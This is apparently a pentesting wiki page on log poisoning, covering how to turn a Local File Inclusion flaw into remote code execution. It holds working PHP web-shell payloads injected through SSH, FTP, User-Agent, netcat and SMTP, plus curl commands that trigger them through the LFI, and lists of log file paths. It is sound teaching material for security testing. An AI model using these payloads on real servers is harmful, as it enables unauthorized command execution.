# Logs Poisoning

## Theory

Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability. To make it work an attacker attempts to inject malicious input to the server log.

## Practice

{% hint style="danger" %}
**If you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**
{% endhint %}

{% hint style="danger" %}
make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.
{% endhint %}

<details>

<summary>/var/log/auth.log</summary>

We can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth.log`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.

```bash
# Sending the payload via SSH
ssh '<?php phpinfo(); ?>'@$TARGET

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
```

</details>

<details>

<summary>/var/log/vsftpd.log</summary>

When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and trying to login setting the PHP payload in the username and then access the logs using the LFI.

```bash
# Sending the payload via FTP
ftp $TARGET_IP
> '<?php system($_GET['cmd'])?>'

# Accessing the log file via LFI
curl --user-agent "PENTEST" $URL/?parameter=/var/log/vsftpd.log&cmd=id
```

</details>

<details>

<summary>Apache/Nginx access.log</summary>

When the web application is using an Apache2 or Nginx server, the `access.log` may be accessible using an LFI.

```bash
# Sending the payload in user agent via curl
curl --user-agent "<?php passthru(\$_GET['cmd']); ?>" $URL

# Accessing the log file via LFI
curl $URL/?parameter=/var/log/apache2/access.log&cmd=id
```

You may find the access.log files on the following locations, for more locations you may use one of this [wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI):

```bash
# APACHE LOG FILE
## RHEL/Red Hat/CentOS/Fedora
/var/log/httpd/access_log

## Debian/Ubuntu
/var/log/apache2/access.log
/var/log/apache/access.log
/usr/local/apache2/log/access.log
/usr/local/apache/log/access.log

## FreeBSD
/var/log/httpd-access.log

## Windows
C:\xampp\apache\logs\access.log

# NGINX LOG FILE
## Linux
/var/log/nginx/access.log

## Windows
C:\nginx\logs\access.log
```

</details>

<details>

<summary>Apache/Nginx error.log</summary>

This one is similar to the `access.log`, but instead of putting simple requests in the log file, it will put errors in `error.log`.

As the `/<?php passthru($_GET['cmd']); ?>` page doesn't exist, it will be logged to the error.log

```bash
# Sending the payload via netcat (avoid url encoding)
nc $TARGET_IP $TARGET_PORT
> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
> Host: $TARGET_IP
> Connection: close

# Accessing the log file via LFI
curl $URL/?parameter=/var/log/apache2/error.log&cmd=id
```

You may find the access.log files on the following locations, for more locations you may use one of this [wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI):

```bash
# APACHE LOG FILE
## RHEL/Red Hat/CentOS/Fedora
/var/log/httpd/error_log

## Debian/Ubuntu
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache2/log/error.log
/usr/local/apache/log/error.log

## FreeBSD
/var/log/httpd-error.log

## Windows
C:\xampp\apache\logs\access.log

# NGINX LOG FILE
## Linux
/var/log/nginx/error.log

## Windows
C:\nginx\logs\error.log
```

</details>

<details>

<summary>Email Logs</summary>

When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet (as an example).

```bash
# Sending the payload via telnet
telnet $TARGET_IP $TARGET_PORT*
> HELO $DOMAIN
> MAIL FROM:<pentest@pentest.com>
> RCPT TO:<?php system($_GET['cmd']); ?>

# Accessing the log file via LFI
curl "$URL/?parameter=/var/log/mail.log&cmd=id"
```

Alternatively, s**end a mail** to a internal account (user@localhost) containing your PHP payload

```bash
# Sending the payload via telnet
telnet $TARGET_IP $TARGET_PORT
> HELO localhost
> MAIL FROM:<pentest@pentest.com>
> RCPT TO:<www-data@localhost>
> DATA
> subject: RCE
> <?php system($_GET['cmd']); ?>
> .

# Accessing the log file via LFI
curl "$URL/?parameter=/var/spool/mail/www-data&cmd=id"

```

</details>



## References

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi2rce" %}

{% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning" %}

{% embed url="https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d" %}
